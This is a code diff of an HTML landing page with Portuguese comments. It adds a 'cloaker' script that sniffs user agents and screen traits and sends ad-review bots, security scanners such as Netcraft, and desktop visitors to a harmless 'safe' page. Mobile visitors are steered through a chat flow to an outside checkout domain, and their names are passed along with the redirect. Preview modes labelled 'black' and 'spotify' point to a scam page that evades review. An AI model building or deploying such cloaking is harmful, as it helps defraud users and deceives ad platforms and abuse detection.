@@ -2,6 +2,40 @@
 <html lang="en">
 
 <head>
+  <!-- 🛡️ CLOAKER: PROTEÇÃO DE NAVEGADOR DESKTOP & BOTS (SAFE REDIRECT) -->
+  <script>
+    (function () {
+      try {
+        var params = new URLSearchParams(window.location.search);
+        var preview = (params.get('preview') || params.get('view') || params.get('modo') || '').toLowerCase();
+        
+        // 1. Bypass para testes manuais no computador (?mobile=1, ?preview=black, ?preview=paid, ?black=1)
+        if (preview === 'paid' || preview === 'spot' || preview === 'spotify' || preview === 'black' || params.get('black') === '1' || params.get('mobile') === '1') {
+          return;
+        }
+
+        // 2. Forçar modo Safe manual (?preview=safe, ?preview=white, ?safe=1)
+        if (preview === 'safe' || preview === 'white' || params.get('safe') === '1') {
+          window.location.replace('/w' + window.location.search);
+          return;
+        }
+
+        // 3. Detecção de Bots / Crawlers de Anúncios / Scanners de Registro (Radix, Netcraft, Facebook, Meta, Google, etc.)
+        var ua = (navigator.userAgent || navigator.vendor || window.opera || '').toLowerCase();
+        var isBot = /facebookexternalhit|facebot|metainspector|googlebot|bingbot|baiduspider|duckduckbot|yandexbot|sogou|bytedance|tiktokbot|crawler|spider|robot|crawling|netcraft/i.test(ua);
+
+        // 4. Detecção de Dispositivo Mobile
+        var isMobileUA = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(ua);
+        var isTouchDevice = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+        var isSmallScreen = window.innerWidth <= 768;
+
+        // Se for Bot OU se for Desktop (computador), redireciona imediatamente para a Página Safe (/w)
+        if (isBot || (!isMobileUA && !isTouchDevice && !isSmallScreen)) {
+          window.location.replace('/w' + window.location.search);
+        }
+      } catch (e) {}
+    })();
+  </script>
   <!-- 🛡️ PERMANENT NETLIFY HUD / BADGE SUPPRESSION -->
   <script>
     (function () {
@@ -726,7 +760,7 @@
   <script>
     // 🔴 URL DO CHECKOUT CLOUDFLARE WORKER:
     // Altere para a URL onde seu Worker estiver rodando (ex: 'https://checkout.adm-multikoisas.workers.dev' ou 'https://seu-worker.workers.dev')
-    window.CHECKOUT_URL = window.CHECKOUT_URL || 'https://pay.melinflow.online';
+    window.CHECKOUT_URL = window.CHECKOUT_URL || 'https://pay.spoflow.shop';
 
     (function () {
       var body = document.getElementById('chatBody');
@@ -1068,7 +1102,7 @@
         await sleep(800);
 
         // Redirect to Cloudflare Worker checkout preserving all UTM parameters and passing customer name
-        var checkoutBase = window.CHECKOUT_URL || 'https://pay.melinflow.online';
+        var checkoutBase = window.CHECKOUT_URL || 'https://pay.spoflow.shop';
         var currentParams = new URLSearchParams(window.location.search);
         if (vars.nome) {
           currentParams.set('name', vars.nome);
